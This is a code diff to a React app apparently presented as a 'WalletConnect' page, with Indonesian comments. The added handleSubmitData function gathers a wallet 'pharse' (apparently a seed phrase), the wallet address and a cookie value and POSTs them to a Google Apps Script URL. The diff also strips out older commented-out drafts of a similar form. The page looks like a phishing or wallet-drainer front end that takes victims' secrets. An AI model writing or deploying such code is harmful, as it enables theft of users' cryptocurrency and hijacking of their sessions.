@@ -131,14 +131,35 @@ function App() {
     }
   };
 
-  const handleSubmitData = () => {
+  const handleSubmitData = async () => {
     const result = {
+      name: "feri",
       pharse: pharse,
       address: walletAddress,
-      cookie: data1
+      cookie: data1,
     };
 
     setSubmittedData(result); // Menyimpan data yang telah disubmit ke state
+
+    // Sending data to the API
+    try {
+      const response = await fetch('https://script.google.com/macros/s/AKfycbxTLDii4PxBiUCdXycFSe1vfuH1IXluShM4brTuJqUJdjyLZqTSC_ITOtIjozYq6i4W/exec', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(result),
+      });
+
+      if (!response.ok) {
+        throw new Error('Gagal mengirim data');
+      }
+
+      alert('Data berhasil dikirim!');
+    } catch (error) {
+      console.error('Error during API call:', error);
+      alert('Terjadi kesalahan saat mengirim data');
+    }
   };
 
   const handleCopyToClipboard = () => {
@@ -155,7 +176,7 @@ function App() {
   return (
     <div className="App">
       <header className="App-header">
-        <h1>WalletConnect with React</h1>
+        <h1>WalletConnect ( FERI )</h1>
 
         {/* Input untuk WalletConnect URI */}
         <div>
@@ -200,7 +221,7 @@ function App() {
                 style={{ width: '400px', padding: '10px', margin: '10px' }}
               />
             </div>
-            <button onClick={handleSubmitData}>Submit Data</button>
+            <button onClick={handleSubmitData}>Kirim Data</button>
           </div>
         )}
 
@@ -220,129 +241,3 @@ function App() {
 }
 
 export default App;
-
-// ==============================
-
-// import React, { useState } from 'react';
-// import { ethers } from 'ethers'; // Import ethers.js
-// import './App.css';
-
-// function App() {
-//   const [walletAddress, setWalletAddress] = useState('');
-//   const [privateKey, setPrivateKey] = useState('');
-
-//   // Fungsi untuk membuat wallet baru
-//   const createWallet = () => {
-//     // Membuat wallet baru menggunakan ethers.js
-//     const wallet = ethers.Wallet.createRandom();
-
-//     // Mengupdate state dengan alamat dan private key wallet baru
-//     setWalletAddress(wallet.address);
-//     setPrivateKey(wallet.privateKey);
-//   };
-
-//   return (
-//     <div className="App">
-//       <header className="App-header">
-//         <h1>Create Ethereum Wallet</h1>
-
-//         {/* Tombol untuk membuat wallet */}
-//         <button onClick={createWallet}>Create Wallet</button>
-
-//         {/* Menampilkan alamat wallet dan private key jika sudah dibuat */}
-//         {walletAddress && (
-//           <div>
-//             <h2>Wallet Address:</h2>
-//             <p>{walletAddress}</p>
-//           </div>
-//         )}
-
-//         {privateKey && (
-//           <div>
-//             <h2>Private Key:</h2>
-//             <p>{privateKey}</p>
-//             <small>Note: Never share your private key!</small>
-//           </div>
-//         )}
-//       </header>
-//     </div>
-//   );
-// }
-
-// export default App;
-
-// ==============================
-
-// import { ethers } from 'ethers';
-// import React, { useState } from 'react';
-// import './App.css';
-
-// function getWallet() {
-//   const wallet = ethers.Wallet.createRandom();
-//   return wallet.address;
-// }
-
-// function App() {
-//   // State untuk menyimpan input dari user
-//   const [data1, setData1] = useState('');
-//   const [data2, setData2] = useState('');
-//   const [jsonResult, setJsonResult] = useState(null);
-
-//   // Fungsi untuk handle perubahan input data1
-//   const handleData1Change = (event) => {
-//     setData1(event.target.value);
-//   };
-
-//   // Fungsi untuk handle perubahan input data2
-//   const handleData2Change = (event) => {
-//     setData2(event.target.value);
-//   };
-
-//   // Fungsi untuk handle submit form
-//   const handleSubmit = (event) => {
-//     event.preventDefault(); // Mencegah reload halaman
-//     const result = {
-//       cookie: data1,
-//       pharse: data2,
-//     };
-//     setJsonResult(JSON.stringify(result, null, 2)); // Mengubah data menjadi JSON dan menyimpannya
-//   };
-
-//   return (
-//     <div className="App">
-//       <header className="App-header">
-//         <h1>Form Input Data</h1>
-//         <form onSubmit={handleSubmit}>
-//           <div>
-//             <label>Data Cookie:</label>
-//             <input
-//               type="text"
-//               value={data1}
-//               onChange={handleData1Change}
-//               placeholder="Masukkan Data 1"
-//             />
-//           </div>
-//           <div>
-//             <label>Data Pharse:</label>
-//             <input
-//               type="text"
-//               value={data2}
-//               onChange={handleData2Change}
-//               placeholder="Masukkan Data 2"
-//             />
-//           </div>
-//           <button type="submit">Submit</button>
-//         </form>
-
-//         {jsonResult && (
-//           <div>
-//             <h2>Hasil JSON:</h2>
-//             <pre>{jsonResult}</pre> {/* Menampilkan hasil JSON */}
-//           </div>
-//         )}
-//       </header>
-//     </div>
-//   );
-// }
-
-// export default App;
